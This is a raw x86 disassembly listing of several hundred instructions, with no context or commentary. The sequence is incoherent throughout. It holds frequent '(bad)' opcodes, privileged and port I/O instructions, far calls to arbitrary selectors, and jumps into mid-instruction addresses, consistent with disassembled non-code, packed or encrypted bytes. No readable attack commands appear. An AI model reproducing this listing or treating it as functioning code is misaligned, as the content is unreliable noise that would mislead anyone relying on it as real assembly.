  4143d6:	loop   0x41443d
  4143d8:	dec    ebp
  4143d9:	sbb    BYTE PTR [esi+0x57],bl
  4143dc:	jle    0x4143d3
  4143de:	mov    ebp,0x1423e22b
  4143e3:	lock fucomi st,st(0)
  4143e6:	test   BYTE PTR [ecx],cl
  4143e8:	sub    DWORD PTR [ebx-0x3e],edx
  4143eb:	push   esi
  4143ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143ed:	mov    BYTE PTR [ecx-0x61],bh
  4143f0:	movhps QWORD PTR [ebp-0x20],xmm7
  4143f4:	pop    edx
  4143f5:	mov    ds:0x75b02f31,eax
  4143fa:	(bad)  
  4143fb:	(bad)  
  4143fc:	sub    al,0x94
  4143fe:	aaa    
  4143ff:	jge    0x4143c4
  414401:	mov    ch,0x83
  414403:	sti    
  414404:	fs jnp 0x41447b
  414407:	out    0x9e,al
  414409:	xor    dh,bl
  41440b:	adc    ecx,DWORD PTR [ecx-0x6b]
  41440e:	jl     0x4143ae
  414410:	push   edx
  414411:	loop   0x4143fd
  414413:	ret    0xd8e8
  414416:	push   ss
  414417:	rcr    DWORD PTR [edx-0x50],0x68
  41441b:	das    
  41441c:	je     0x414463
  41441e:	fst    st(5)
  414420:	int3   
  414421:	pushf  
  414422:	jbe    0x414400
  414424:	pop    ecx
  414425:	xor    al,0x90
  414427:	mov    edx,edx
  414429:	loop   0x414459
  41442b:	pushf  
  41442c:	fnstenv [eax+0x4575610a]
  414432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414433:	sti    
  414434:	repz aad 0x66
  414437:	pop    ebp
  414438:	sar    ecx,1
  41443a:	adc    dh,bl
  41443c:	mov    ecx,0x5fdbbda5
  414441:	sbb    eax,0x16f17e08
  414446:	sub    al,0x6
  414448:	pop    eax
  414449:	push   ebx
  41444a:	cmp    DWORD PTR [edx],ecx
  41444c:	hlt    
  41444d:	outs   dx,BYTE PTR ds:[esi]
  41444e:	dec    edx
  41444f:	rol    BYTE PTR [ebx+0x6fe9f4fc],0xbe
  414456:	call   0x34df:0x2490d3d2
  41445d:	jg     0x414419
  41445f:	in     eax,0xbf
  414461:	fsubr  st(6),st
  414463:	rol    bh,1
  414465:	dec    esi
  414466:	jns    0x414440
  414468:	test   eax,0x26e532e2
  41446d:	and    edx,0x6035978a
  414473:	pop    edx
  414474:	xor    DWORD PTR [edx+0x1f],edi
  414477:	mov    bl,bh
  414479:	jae    0x41440d
  41447b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41447c:	shl    BYTE PTR [ebx],0x91
  41447f:	jae    0x41449e
  414481:	mov    edi,0xa5d6cfcc
  414486:	call   0x384f:0x8f95c4aa
  41448d:	sub    eax,0xfcd26a8a
  414492:	sar    DWORD PTR [ecx+ecx*4+0x2709ad60],0xc9
  41449a:	xchg   edx,eax
  41449b:	dec    edx
  41449c:	js     0x414439
  41449e:	jle    0x4144f0
  4144a0:	and    edi,0xb2158265
  4144a6:	push   ebp
  4144a7:	or     eax,0x22630bbd
  4144ac:	sbb    ah,BYTE PTR [ebp+0x30d9046a]
  4144b2:	scas   al,BYTE PTR es:[edi]
  4144b3:	outs   dx,BYTE PTR ds:[esi]
  4144b4:	fisub  DWORD PTR [ebp+0x24]
  4144b7:	retf   0xdfa
  4144ba:	push   ds
  4144bb:	adc    eax,0xed45aff0
  4144c0:	sbb    eax,0xad69cc00
  4144c5:	dec    esi
  4144c6:	stos   BYTE PTR es:[edi],al
  4144c7:	ret    
  4144c8:	mov    WORD PTR [edi],?
  4144ca:	dec    BYTE PTR [edx]
  4144cc:	sub    DWORD PTR [ecx+ebx*2-0x26],edx
  4144d0:	inc    edi
  4144d1:	enter  0x2289,0x50
  4144d5:	not    BYTE PTR [ecx]
  4144d7:	jmp    0x41445d
  4144d9:	jge    0x4144a0
  4144db:	xor    dh,BYTE PTR [eax-0x3452c4e4]
  4144e1:	pop    edx
  4144e2:	inc    ebx
  4144e3:	mov    bl,0x25
  4144e5:	ins    BYTE PTR es:[edi],dx
  4144e6:	(bad)  
  4144e7:	xor    edx,DWORD PTR [ebp-0x3f9f0c40]
  4144ed:	fild   WORD PTR [edx+0x68123bbf]
  4144f3:	add    bh,BYTE PTR [ecx]
  4144f5:	inc    eax
  4144f6:	cdq    
  4144f7:	fs inc ecx
  4144f9:	call   DWORD PTR [edx+0xa]
  4144fc:	arpl   WORD PTR [edi],dx
  4144fe:	repz mov cl,0xf2
  414501:	xchg   edx,eax
  414502:	mov    ebx,0x2624b39e
  414507:	and    eax,0x70657921
  41450c:	mov    esp,0x6f0e3be7
  414511:	popf   
  414512:	popa   
  414513:	adc    eax,0xf073aa41
  414518:	sbb    al,0x43
  41451a:	loope  0x41450b
  41451c:	sub    eax,0xa47b11c6
  414521:	push   esp
  414522:	jno    0x41459d
  414524:	(bad)  
  414525:	aad    0xbd
  414527:	mov    eax,ds:0x90d1d8af
  41452c:	jno    0x4144d7
  41452e:	std    
  41452f:	out    0xb9,al
  414531:	dec    edi
  414532:	xor    DWORD PTR [edx],edx
  414534:	sbb    eax,0xf8b6d131
  414539:	nop
  41453a:	push   edx
  41453b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41453c:	data16 fild WORD PTR [ebx]
  41453f:	adc    eax,0x34bec7eb
  414544:	xchg   edi,eax
  414545:	push   ecx
  414546:	mov    BYTE PTR [edi+0x7a],cl
  414549:	add    al,0xb0
  41454b:	mov    ds:0xb1451c4e,eax
  414550:	mov    esi,0x59a5d85f
  414555:	out    dx,eax
  414556:	dec    ebx
  414557:	lea    ebx,[ebx+0x6d7f2d1c]
  41455d:	and    BYTE PTR [edi+0x10],bl
  414560:	les    ebp,FWORD PTR [edx]
  414562:	pop    edx
  414563:	call   0x5776:0x5006e0e7
  41456a:	and    BYTE PTR [edi],0x3
  41456d:	scas   eax,DWORD PTR es:[edi]
  41456e:	or     dh,BYTE PTR ds:0xe116bb0a
  414574:	xor    DWORD PTR [edi],eax
  414576:	out    dx,eax
  414577:	or     eax,0xc208989a
  41457c:	xor    al,0x14
  41457e:	xlat   BYTE PTR ds:[ebx]
  41457f:	(bad)  
  414580:	not    DWORD PTR [edx+0x5c]
  414583:	pop    ds
  414584:	pushf  
  414585:	scas   eax,DWORD PTR es:[edi]
  414586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414587:	push   edi
  414588:	pop    ecx
  414589:	aaa    
  41458a:	cmp    bh,BYTE PTR [ebx-0x5592a49]
  414590:	stos   DWORD PTR es:[edi],eax
  414591:	xchg   esp,eax
  414592:	xor    eax,0xccb421ce
  414597:	or     DWORD PTR [ebx],esp
  414599:	or     edx,DWORD PTR [esi+edi*8+0x7e]
  41459d:	cmp    ah,al
  41459f:	mov    gs,WORD PTR [ecx-0x79]
  4145a2:	out    dx,eax
  4145a3:	mov    BYTE PTR [eax+eax*2+0x5e],0x50
  4145a8:	mov    bh,0xa8
  4145aa:	arpl   WORD PTR [esi+ebp*8],bx
  4145ad:	es mov bh,0xeb
  4145b0:	jne    0x41456f
  4145b2:	mov    ah,al
  4145b4:	xor    edx,DWORD PTR [ecx]
  4145b6:	cmp    eax,0xcbfef2f0
  4145bb:	mov    bh,0x95
  4145bd:	sti    
  4145be:	jb     0x4145ae
  4145c0:	and    bl,BYTE PTR [eax+0x3a]
  4145c3:	xchg   ecx,eax
  4145c4:	ins    DWORD PTR es:[edi],dx
  4145c5:	cli    
  4145c6:	pop    es
  4145c7:	inc    eax
  4145c8:	and    al,0x1f
  4145ca:	(bad)  
  4145cb:	or     eax,0xe56e2bb6
  4145d0:	xchg   DWORD PTR [eax+0x3e38528e],ebx
  4145d6:	test   BYTE PTR [edi+ecx*1-0x77],cl
  4145da:	fdiv   DWORD PTR [ebp-0x56]
  4145dd:	(bad)  
  4145de:	dec    esi
  4145df:	mov    bl,0x27
  4145e1:	push   esp
  4145e2:	pop    ecx
  4145e3:	cmp    eax,0xa5b669d6
  4145e8:	inc    eax
  4145e9:	stos   DWORD PTR es:[edi],eax
  4145ea:	neg    BYTE PTR [eax-0x66]
  4145ed:	jg     0x41460d
  4145ef:	push   eax
  4145f0:	or     bl,BYTE PTR [edx+eiz*4+0x46eac05]
  4145f7:	and    ch,BYTE PTR [ecx-0x5d2b423]
  4145fd:	mov    edi,0xe43829e6
  414602:	inc    edx
  414603:	pop    edi
  414604:	(bad)
  414607:	add    BYTE PTR [eax],dh
  414609:	push   edi
  41460a:	and    DWORD PTR [edi+0x6a4289e2],ebp
  414610:	sbb    esp,ebx
  414612:	(bad)  
  414613:	rcr    DWORD PTR [ebp+ebx*1-0x37625201],1
  41461a:	push   edi
  41461b:	xor    DWORD PTR [ebx],0x9a77ba67
  414621:	out    0x9f,eax
  414623:	outs   dx,DWORD PTR ds:[esi]
  414624:	shl    BYTE PTR [eax+0x4f6e9788],cl
  41462a:	sti    
  41462b:	sub    ch,BYTE PTR [eax]
  41462d:	aaa    
  41462e:	pop    edi
  41462f:	test   ch,ch
  414631:	into   
  414632:	dec    ebp
  414633:	addr16 mov esp,0x3e20eae0
  414639:	push   ss
  41463a:	inc    ecx
  41463b:	pop    esi
  41463c:	sbb    dl,BYTE PTR [edi+0x3c994ae3]
  414642:	cmp    dh,0xf
  414645:	pop    ss
  414646:	retw   
  414648:	adc    DWORD PTR [esi+0x61],esp
  41464b:	lods   eax,DWORD PTR ds:[esi]
  41464c:	mov    esi,0xed84020e
  414651:	jo     0x41461c
  414653:	ss push esi
  414655:	fmul   QWORD PTR [esi-0x67]
  414658:	and    eax,0xa0a123b
  41465d:	lds    esi,FWORD PTR [ecx-0x21]
  414660:	dec    ebp
  414661:	mov    eax,DWORD PTR [edi+0x56]
  414664:	or     dh,BYTE PTR [ecx]
  414666:	sub    BYTE PTR [ecx-0x64],ch
  414669:	repz sar BYTE PTR [edx-0x51143ecf],cl
  414670:	das    
  414671:	les    cx,DWORD PTR [edx-0x7715fe83]
  414678:	fs add eax,0x78556cbd
  41467e:	adc    edi,esi
  414680:	push   cs
  414681:	clc    
  414682:	mov    ebx,DWORD PTR [esi+esi*1-0x7a50bd14]
  414689:	mov    ds:0x7b1731e8,eax
  41468e:	(bad)  
  414690:	loopne 0x414640
  414692:	daa    
  414693:	(bad)
  414696:	cmp    ebx,eax
  414698:	shl    DWORD PTR [edi],1
  41469a:	sti    
  41469b:	out    0xd8,eax
  41469d:	lods   eax,DWORD PTR ds:[esi]
  41469e:	pusha  
  41469f:	mov    bl,dh
  4146a1:	mov    ch,bl
  4146a3:	ret    0xf7b7
  4146a6:	push   ebx
  4146a7:	aam    0xbe
  4146a9:	(bad)  
  4146aa:	(bad)  
  4146ab:	into   
  4146ac:	ja     0x4146eb
  4146ae:	call   0x32137945
  4146b3:	and    BYTE PTR [eax-0x676aa5c9],dh
  4146b9:	ret    
  4146ba:	cwde   
  4146bb:	jecxz  0x41470e
  4146bd:	idiv   BYTE PTR [edx]
  4146bf:	dec    edi
  4146c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146c1:	pop    ss
  4146c2:	jae    0x414697
  4146c4:	jecxz  0x414707
  4146c6:	jecxz  0x4146e0
  4146c8:	cmp    eax,0x6c44ed4e
  4146cd:	mov    bl,0xc6
  4146cf:	js     0x414738
  4146d1:	sub    dl,al
  4146d3:	sbb    al,cl
  4146d5:	mov    ah,0xe0
  4146d7:	(bad)  
  4146d8:	fmul   DWORD PTR [ebx-0x2d]
  4146db:	into   
  4146dc:	jae    0x4146bf
  4146de:	fiadd  WORD PTR [ebx-0x7c60b059]
  4146e4:	pusha  
  4146e5:	jns    0x414749
  4146e7:	mov    al,0xbb
  4146e9:	jo     0x41472c
  4146eb:	and    cl,0xc5
  4146ee:	call   0x6ac8352a
  4146f3:	leave  
  4146f4:	stos   DWORD PTR es:[edi],eax
  4146f5:	dec    esi
  4146f6:	sbb    al,0xc3
  4146f8:	jae    0x41468e
  4146fa:	jle    0x414714
  4146fc:	cmc    
  4146fd:	and    eax,0x826e8569
  414702:	test   edx,ebp
  414704:	pop    ds
  414705:	shl    DWORD PTR [ecx],cl
  414707:	bound  esp,QWORD PTR [edi+eax*2-0x7f]
  41470b:	mov    ebx,0xa80f8a4b
  414710:	shl    BYTE PTR [ebx+0xb],cl
  414713:	call   0x856d754
  414718:	xchg   edx,eax
  414719:	add    BYTE PTR [eax+0x7a1e5548],ah
  41471f:	shr    BYTE PTR [esi+0x17f571c4],1
  414725:	fdivr  DWORD PTR [edi]
  414727:	and    bl,bl
  414729:	push   edi
  41472a:	clc    
  41472b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41472c:	in     eax,dx
  41472d:	(bad)  
  41472f:	sar    dh,cl
  414731:	inc    ecx
  414732:	sub    eax,0x4f4ecbba
  414737:	push   0x4150fa2c
  41473c:	imul   edx,DWORD PTR [edi+0x2a],0xffffff8d
  414740:	repz test DWORD PTR [edi+0x65d1c822],esp
  414747:	adc    dl,bl
  414749:	sar    BYTE PTR [ebx-0x39],cl
  41474c:	mov    cl,0x97
  41474e:	cmp    ebp,DWORD PTR [edx]
  414750:	lock out dx,al
  414752:	std    
  414753:	mov    eax,ds:0x3b963d4a
  414758:	fs cli 
  41475a:	mov    al,0x77
  41475c:	push   eax
  41475d:	cwde   
  41475e:	loope  0x4146fa
  414760:	pusha  
  414761:	lahf   
  414762:	fbstp  TBYTE PTR [edx+0x29704681]
  414768:	lea    eax,[esi+ebx*2-0x3766a6e3]
  41476f:	loop   0x414797
  414771:	jle    0x41474b
  414773:	gs jg  0x414792
  414776:	mov    ds:0xd58edc1c,al
  41477b:	(bad)  
  41477c:	ror    BYTE PTR [edx],1
  41477e:	in     eax,0x50
  414780:	pop    esi
  414781:	es push esi
  414783:	aam    0x39
  414785:	sub    eax,0x68611950
  41478a:	cmc    
  41478b:	retf   0x64d7
  41478e:	pop    ds
  41478f:	dec    ecx
  414790:	arpl   WORD PTR [eax+esi*2],bp
  414793:	call   0x66f9:0x5e17c31a
  41479a:	fisttp QWORD PTR [ebp+0x6e]
  41479d:	jne    0x41475b
  41479f:	stc    
  4147a0:	inc    edi
  4147a1:	mov    bh,BYTE PTR [eax+0x3f]
  4147a4:	mov    ebp,0x1d519cab
  4147a9:	ret    
  4147aa:	aam    0xf8
  4147ac:	mov    al,ds:0xe93be45a
  4147b1:	mov    ebp,0x8005c376
  4147b6:	cwde   
  4147b7:	inc    eax
  4147b8:	arpl   WORD PTR [eax+0x1582a0ac],bp
  4147be:	pop    ebp
  4147bf:	pop    ebx
  4147c0:	pop    ds
  4147c1:	lods   al,BYTE PTR ds:[esi]
  4147c2:	mov    dl,0x5d
  4147c4:	sub    DWORD PTR [ecx],ecx
  4147c6:	movlps QWORD PTR ds:0xab7753d8,xmm7
  4147cd:	ja     0x414760
  4147cf:	pop    ecx
  4147d0:	jbe    0x414796
  4147d2:	adc    al,0x92
  4147d4:	and    al,0x14
  4147d6:	shr    DWORD PTR [eax+edi*4],1
  4147d9:	xlat   BYTE PTR ds:[ebx]
  4147da:	push   esi
  4147db:	(bad)  
  4147dc:	in     eax,dx
  4147dd:	retf   0x964d
  4147e0:	call   0xf905:0x8b9c781a
  4147e7:	sub    eax,0x76fa2faa
  4147ec:	out    0x5e,al
  4147ee:	stos   DWORD PTR es:[edi],eax
  4147ef:	pop    edi
  4147f0:	sbb    eax,0xbecca816
  4147f5:	(bad)  
  4147f6:	stc    
  4147f7:	mov    dl,0xde
  4147f9:	cmp    ecx,DWORD PTR ds:[ebp+0x35f02367]
  414800:	jnp    0x414803
  414802:	mov    cl,0x71
  414804:	push   0x8eb35822
  414809:	xor    eax,0x29995f8c
  41480e:	sbb    bl,bh
  414810:	out    dx,eax
  414811:	xchg   BYTE PTR [ecx],ah
  414813:	mov    ch,0x50
  414815:	add    eax,0x4601ca21
  41481a:	xchg   ecx,eax
  41481b:	fidiv  DWORD PTR [ecx-0x191a79d1]
  414821:	mov    al,0x16
  414823:	fistp  DWORD PTR [ecx-0x70]
  414826:	mov    WORD PTR [ebx+0x7c],ds
  414829:	cmp    BYTE PTR [edi-0x48],ch
  41482c:	popf   
  41482d:	xchg   ebp,eax
  41482e:	call   0x76420752
  414833:	adc    ax,0x4652
  414837:	mov    ch,0x17
  414839:	(bad)  
  41483a:	ds mov esp,0xd6645a77
  414840:	sub    DWORD PTR [eax],ebx
  414842:	mov    dl,0xc6
  414844:	(bad)  
  414845:	xor    eax,DWORD PTR [ebp+0x63f3c960]
  41484b:	pop    ds
  41484c:	mov    eax,ds:0xf3f82a6e
  414851:	jb     0x4147da
  414853:	sbb    BYTE PTR [edx],al
  414855:	jb     0x41483f
  414857:	lods   al,BYTE PTR cs:[esi]
  414859:	fild   QWORD PTR [edi+0x5d]
  41485c:	xchg   ecx,eax
  41485d:	mov    dl,0x23
  41485f:	push   cs
  414860:	test   al,0x99
  414862:	and    bh,BYTE PTR [ecx]
  414864:	ins    BYTE PTR es:[edi],dx
  414865:	xlat   BYTE PTR ds:[ebx]
  414866:	das    
  414867:	out    dx,al
  414868:	sub    DWORD PTR [esp+edx*8],ebx
  41486b:	stc    
  41486c:	sbb    ebx,DWORD PTR [ecx+ebx*1+0x38]
  414870:	add    al,0x6c
  414872:	jg     0x4148c5
  414874:	call   0xf02be58d
  414879:	jb     0x414815
  41487b:	(bad)  
  41487c:	adc    esi,esp
  41487e:	mov    ebx,0xab899a1e
  414883:	fs jmp 0x5ad7:0x619e9105
  41488b:	fistp  QWORD PTR ds:0x47ceadc1
  414891:	repz popa 
  414893:	jb     0x414839
  414895:	aaa    
  414896:	push   ds
  414897:	in     al,dx
  414898:	jl     0x414847
  41489a:	mov    BYTE PTR [ecx-0x76],dh
  41489d:	xchg   edx,eax
  41489e:	sbb    BYTE PTR [edx],al
  4148a0:	ror    DWORD PTR [edx],0x40
  4148a3:	jb     0x414832
  4148a5:	dec    ebx
  4148a6:	xchg   esi,eax
  4148a7:	adc    DWORD PTR [eax],ecx
  4148a9:	mov    edi,0x3299bd39
  4148ae:	out    0xe7,al
  4148b0:	mov    dh,al
  4148b2:	sbb    cl,dl
  4148b4:	(bad)  
  4148b5:	mov    ebx,0x96a18930
  4148ba:	(bad)  
  4148bb:	lds    ebp,FWORD PTR [edx+0x3b5ca560]
  4148c1:	jecxz  0x41487c
  4148c3:	cmp    bh,BYTE PTR [edx]
  4148c5:	pop    ebp
  4148c6:	push   esp
  4148c7:	test   al,0x3c
  4148c9:	jne    0x41486e
  4148cb:	jo     0x4148a7
  4148cd:	stos   DWORD PTR es:[edi],eax
  4148ce:	dec    edx
  4148cf:	pop    eax
  4148d0:	rol    al,1
  4148d2:	psrld  mm6,mm7
  4148d5:	loop   0x414935
  4148d7:	cld    
  4148d8:	inc    edx
  4148d9:	add    ch,BYTE PTR [esi-0x5d]
  4148dc:	push   0x4
  4148de:	ss inc edi
  4148e0:	test   BYTE PTR [esi-0x4c17bf85],cl
  4148e6:	pop    esi
  4148e7:	push   ss
  4148e8:	scas   eax,DWORD PTR es:[edi]
  4148e9:	mov    ebp,0xed699626
  4148ee:	sahf   
  4148ef:	sbb    al,0xba
  4148f1:	sub    al,BYTE PTR [ebp-0x32]
  4148f4:	in     al,0xe2
  4148f6:	stc    
  4148f7:	adc    ecx,DWORD PTR [edx+0x1]
  4148fa:	shr    DWORD PTR [edi],1
  4148fc:	in     eax,0xd5
  4148fe:	jne    0x414895
  414900:	sub    DWORD PTR [edx+0x29591fc2],esp
  414906:	or     esi,esp
  414908:	xchg   esp,eax
  414909:	push   ebx
  41490a:	sbb    ebx,DWORD PTR [esi]
  41490c:	fstp   TBYTE PTR [esi]
  41490e:	mov    ah,BYTE PTR [esi+edx*2]
  414911:	lods   al,BYTE PTR ds:[esi]
  414912:	ror    DWORD PTR [ebx-0x71],cl
  414915:	mov    ebx,0xf48c55ee
  41491a:	mov    edx,0xfc25f2f8
  41491f:	sbb    dl,BYTE PTR [ebp-0x6e]
  414922:	lods   eax,DWORD PTR ds:[esi]
  414923:	jb     0x41498a
  414925:	std    
  414926:	aam    0xed
  414928:	retf   
  414929:	lds    esp,FWORD PTR [esi+ecx*2+0x53953ba6]
  414930:	ss sbb cl,dl
  414933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414934:	je     0x414911
  414936:	pop    edx
  414937:	in     al,dx
  414938:	leave  
  414939:	and    eax,0xc7ffcc38
  41493e:	dec    ebx
  41493f:	rol    DWORD PTR [edx+0x51f330ed],cl
  414945:	std    
  414946:	mov    al,ds:0x4ab01e6e
  41494b:	xchg   esi,eax
  41494c:	xchg   esi,eax
  41494d:	es aas 
  41494f:	call   esp
  414951:	hlt    
  414952:	call   0x8995:0x74f621e9
  414959:	jmp    0x4148db
  41495b:	jns    0x41497d
  41495d:	adc    ah,BYTE PTR [eax+0x77ebcc86]
  414963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414964:	imul   bl
  414966:	popa   
  414967:	sbb    al,0xb4
  414969:	jo     0x414941
  41496b:	fs cmp eax,0xee9beb6f
  414971:	xor    al,0x52
  414973:	je     0x414914
  414975:	stos   BYTE PTR es:[edi],al
  414976:	clc    
  414977:	and    al,0x3d
  414979:	push   ds
  41497a:	inc    ax
  41497c:	or     eax,0x8f845cb2
  414981:	aas    
  414982:	popa   
  414983:	fistp  DWORD PTR [edi+esi*1-0x79]
  414987:	sub    edi,DWORD PTR [bp-0x76]
  41498b:	(bad)  
  41498d:	inc    edx
  41498e:	cmp    DWORD PTR [edi+0x1b],0x675d0455
  414995:	or     edx,edi
  414997:	popa   
  414998:	and    eax,0x38a19158
  41499d:	xor    al,0x8b
  41499f:	dec    ebp
  4149a0:	push   ds
  4149a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149a2:	pop    ds
  4149a3:	in     al,0x75
  4149a5:	fs jae 0x4149c8
  4149a8:	pop    ecx
  4149a9:	in     al,0x2e
  4149ab:	mov    ebx,0x78e958cb
  4149b0:	push   edx
  4149b1:	call   0xa4fb:0xff677d09
  4149b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149b9:	add    al,0x3c
  4149bb:	mov    ah,dl
  4149bd:	int    0xae
  4149bf:	and    ebp,DWORD PTR [ebx-0x7b]
  4149c2:	ret    0x6b64
  4149c5:	xor    esp,DWORD PTR [esi+0x20]
  4149c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c9:	dec    ebx
  4149ca:	mov    edi,0x7d1d8a6b
  4149cf:	ins    BYTE PTR es:[edi],dx
  4149d0:	sub    ecx,esi
  4149d2:	popf   
  4149d3:	mov    ebx,0x2281e1a8
  4149d8:	(bad)  
  4149da:	fcomp  st(2)
  4149dc:	(bad)  
  4149dd:	adc    ah,BYTE PTR [ecx*8-0x9138cfd]
  4149e4:	cwde   
  4149e5:	scas   al,BYTE PTR es:[edi]
  4149e6:	ror    dl,1
  4149e8:	test   BYTE PTR [ecx],bh
  4149ea:	push   cs
  4149eb:	rcl    DWORD PTR [esi],0x30
  4149ee:	lss    esi,FWORD PTR [ebx+0x6e]
  4149f2:	mov    WORD PTR [edx+0x1d2e1e2a],ss
  4149f8:	retf   
  4149f9:	ja     0x4149cb
  4149fb:	ins    DWORD PTR es:[edi],dx
  4149fc:	dec    edi
  4149fd:	pop    edi
  4149fe:	sbb    al,BYTE PTR [eax]
  414a00:	dec    eax
  414a01:	jecxz  0x41499a
  414a03:	pusha  
  414a04:	clc    
  414a05:	fdiv   DWORD PTR [ebx]
  414a07:	rcr    BYTE PTR [edx+0x46],cl
  414a0a:	cmp    eax,0xe7e2b32b
  414a0f:	inc    eax
  414a10:	fs push 0xcac58459
  414a16:	push   0xffffffff
  414a18:	add    cl,BYTE PTR ss:[edi+0x3f]
  414a1c:	jecxz  0x4149f9
  414a1e:	xchg   edx,eax
  414a1f:	and    al,0x7a
  414a21:	clc    
  414a22:	push   edi
  414a23:	call   0xd99fb3d4
  414a28:	inc    esi
  414a29:	popa   
  414a2a:	and    ecx,ebx
  414a2c:	and    ch,BYTE PTR [ebp+0x614c6c37]
  414a32:	or     bh,ah
  414a34:	lds    ebx,FWORD PTR [edx]
  414a36:	loop   0x414a4d
  414a38:	pop    edi
  414a39:	push   esp
  414a3a:	mov    bl,0x74
  414a3c:	scas   eax,DWORD PTR es:[edi]
  414a3d:	jge    0x414a02
  414a3f:	aam    0x6b
  414a41:	retf   0x30ae
  414a44:	push   esp
  414a45:	call   0xe180:0x8966fb69
  414a4c:	lock add eax,0x392e7731
  414a52:	daa    
  414a53:	pop    es
  414a54:	xchg   edx,eax
  414a55:	xchg   esi,eax
  414a56:	hlt    
  414a57:	(bad)  
  414a58:	xlat   BYTE PTR ds:[ebx]
  414a59:	nop
  414a5a:	jne    0x414a36
  414a5c:	push   es
  414a5d:	js     0x414a50
  414a5f:	pop    eax
  414a60:	xor    eax,0x34cbd50e
  414a65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a66:	sbb    eax,0xce400066
  414a6b:	aad    0xc4
  414a6d:	sahf   
  414a6e:	fimul  WORD PTR [edi+0x64]
  414a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a72:	iret   
  414a73:	xchg   dl,ch
  414a75:	cmp    DWORD PTR [ebp+0x66eed686],0xffffffa9
  414a7c:	mov    al,0x54
  414a7e:	fisub  WORD PTR [ecx-0x41ed99bb]
  414a84:	adc    eax,0xcfe4bec8
  414a89:	lods   eax,DWORD PTR ds:[esi]
  414a8a:	(bad)  
  414a8b:	pushf  
  414a8c:	pop    ebx
  414a8d:	dec    edx
  414a8e:	lods   eax,DWORD PTR ds:[esi]
  414a8f:	cmp    eax,0x91a2df9a
  414a94:	(bad)  
  414a96:	pop    esp
  414a97:	int    0xf6
  414a99:	aad    0x84
  414a9b:	out    dx,eax
  414a9c:	jecxz  0x414b03
  414a9e:	leave  
  414a9f:	jl     0x414a77
  414aa1:	(bad)  
  414aa2:	mov    eax,cs
  414aa4:	test   al,0xf6
  414aa6:	sbb    cl,BYTE PTR [edx]
  414aa8:	clc    
  414aa9:	icebp  
  414aaa:	push   esp
  414aab:	sub    eax,0xadc773c2
  414ab0:	and    bl,BYTE PTR [edx+eax*1+0x13]
  414ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ab5:	into   
  414ab6:	dec    esp
  414ab7:	mov    edi,0xbc66d940
  414abc:	call   0x5628de3f
  414ac1:	stos   DWORD PTR es:[edi],eax
  414ac2:	stc    
  414ac3:	fnstenv [esp+eax*8+0x7a]
  414ac7:	ret    0x6eb
  414aca:	imul   ebx,esp,0xc3e671cf
  414ad0:	aam    0x81
  414ad2:	loop   0x414a5e
  414ad4:	sub    ah,cl
  414ad6:	ret    0x274a
  414ad9:	add    ebx,DWORD PTR [edx]
  414adb:	into   
  414adc:	sub    al,0xf0
  414ade:	jmp    0x414a98
  414ae0:	addr16 sub eax,0xa9e0d514
  414ae6:	xor    al,0xe6
  414ae8:	test   BYTE PTR [edi+0x17],al
  414aeb:	and    DWORD PTR [ebx],ebp
  414aed:	in     eax,dx
  414aee:	mov    bh,0xda
  414af0:	or     DWORD PTR [ebp+edi*8-0x48],ebx
  414af4:	add    BYTE PTR [edi-0x2222f6f6],bh
  414afa:	pop    ss
  414afb:	in     eax,dx
  414afc:	sbb    eax,0xf1032b2b
  414b01:	in     al,0xad
  414b03:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b05:	fcom   DWORD PTR [esi]
  414b07:	arpl   WORD PTR [edi-0x41384dce],ax
  414b0d:	jno    0x414b5e
  414b0f:	shr    dl,0x1c
  414b12:	imul   ebx,DWORD PTR [eax],0x7b6cb74e
  414b18:	stc    
  414b19:	inc    ebx
  414b1a:	mov    WORD PTR [edi],?
  414b1c:	xchg   BYTE PTR [edi-0x14c75da5],dl
  414b22:	sub    BYTE PTR [ebx],0x23
  414b25:	rcr    DWORD PTR [eax-0x4ae9c56d],cl
  414b2b:	sahf   
  414b2c:	cmc    
  414b2d:	dec    edx
  414b2e:	into   
  414b2f:	js     0x414b37
  414b31:	mov    edi,0x8c3c4f9e
  414b36:	mov    esi,0x5419baa4
  414b3b:	and    DWORD PTR [edx+0x7125513b],edi
  414b41:	loop   0x414b0c
  414b43:	adc    BYTE PTR [edx],0xaf
  414b46:	rol    DWORD PTR [ecx-0x73f83495],1
  414b4c:	ret    0x7f29
  414b4f:	mov    edi,0x9c59a0c1
  414b54:	fcmovnbe st,st(5)
  414b56:	sub    bl,BYTE PTR [edi+0x45]
  414b59:	push   0xffffff96
  414b5b:	dec    eax
  414b5c:	xor    ecx,edx
  414b5e:	cwde   
  414b5f:	fs push es
  414b61:	inc    edi
  414b62:	(bad)  
  414b63:	cmp    al,0x3d
  414b65:	xchg   edi,eax
  414b66:	sub    BYTE PTR [eax+esi*2+0x10],0x87
  414b6b:	sti    
  414b6c:	mov    esp,0x396f4c22
  414b71:	mov    ecx,0x3b82d8c3
  414b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b77:	mov    ecx,0xc4a7ef3c
  414b7c:	enter  0x1913,0x42
  414b80:	in     al,0x1f
  414b82:	je     0x414b16
  414b84:	nop
  414b85:	mov    al,ds:0x45533cb7
  414b8a:	mov    eax,ds:0xe91119b3
  414b8f:	ins    BYTE PTR es:[edi],dx
  414b90:	in     al,dx
  414b91:	cld    
  414b92:	aaa    
  414b93:	cs ret 
  414b95:	pop    esi
  414b96:	addr16 sub al,0x37
  414b99:	ficomp WORD PTR [eax-0x4a0f5003]
  414b9f:	pop    edi
  414ba0:	xchg   edx,eax
  414ba1:	(bad)  
